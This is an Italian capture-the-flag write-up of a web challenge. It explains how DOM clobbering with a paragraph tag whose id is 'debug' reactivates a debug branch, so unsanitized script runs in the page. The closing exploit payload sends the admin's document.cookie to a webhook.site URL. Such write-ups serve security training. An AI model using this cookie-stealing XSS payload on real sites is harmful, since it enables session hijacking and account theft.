# debug_disabilitato

Olicyber - Selezioni territoriali 2023


# Premesse
La challenge non condivide il codice sorgente del backend, di conseguenza sarà necessaria un'attenta osservazione del client, inoltre nell'introduzione ci viene detto che la flag si trova nel cookie dell'admin.

## Analisi
La struttura del sito è semplice: permette di registrarsi, fare il login, aggiungere una nota, vedere le proprie note e reportare una nota all'admin (xss?).
### pagina Show note
in questa pagina, in particolare nello script si vede come viene visualizzata la nota richiesta:
```javascript
window.addEventListener("load", () => {
        let note_id = location.pathname.split('/').at(-1);

        fetch(`/api/note/${note_id}`)
            .then((r) => {
                r.json()
                    .then((data) => {
                        let content = sanitize(data.content);

                        note_title.innerText = `Note ${data.title} : ${note_id}`;
                        note_content.innerHTML = content;

                        // Debug disattivato, da cancellare appena il boss mi da il permesso
                        if (window.debug) {
                            document.write(`<p class='py-6 font-normal text-lg text-zinc-700'>Note title: ${data.title}</p>`);
                            document.write(`<p class='py-6 font-normal text-lg text-zinc-700'>Note content: ${data.content}</p>`);
                        }

                    })
                    .catch((e) => {
                        console.log("INTERNO: ", e);
                        display_404();
                    })
            })
            .catch(() => {
                display_404();
            })
    });
```
funzione sanitize:
```javascript
const sanitize = (data) => {
        return DOMPurify.sanitize(data, {
            ALLOWED_TAGS: ['strong', 'em', 'b', 'img', 'a', 's', 'ul', 'ol', 'li', 'p']
        });

    }
```
inoltre è presente anche un commento / indizio:
```html
<script>
    // window.debug = true;
</script>
```
Il contenuto della nota viene quindi sanitizzato client side per evitare xss.
Per poter fare una xss dobbiamo riattivare il debug, o almeno fare in modo che la condizione window.debug == true sia verificata, e per farlo possiamo sfruttare i tag permessi dalla funzione sanitize.

## Soluzione

Se nel contenuto della nota inseriamo un tag allowed, per esempio un paragraph, e gli diamo un id, allora l'oggetto con lo stesso nome dell'id diventa child di window, di conseguenza se mandiamo un paragraph con id="debug":
```html
<p id="debug"></p>
<script>
alert("xss!")
</script>
```
Il nostro script che veniva prima bloccato dalla funzione sanitize viene inserito nella pagina e viene eseguito perchè la condizione window.debug viene soddisfatta!

A questo punto basterà fare una richiesta ad un nostro webhook e reportare la nota per ottenere il cookie dell'admin.

## Exploit
Nome vulnerabilità: DOM based XSS

```html
<p id="debug"></p>
<script>
fetch("https://webhook.site/your-webhook" + "/" + document.cookie)
</script>
```

Inserendo questo script nel contenuto di una nota e reportandola all'admin otteniamo la flag contenuta nel cookie.

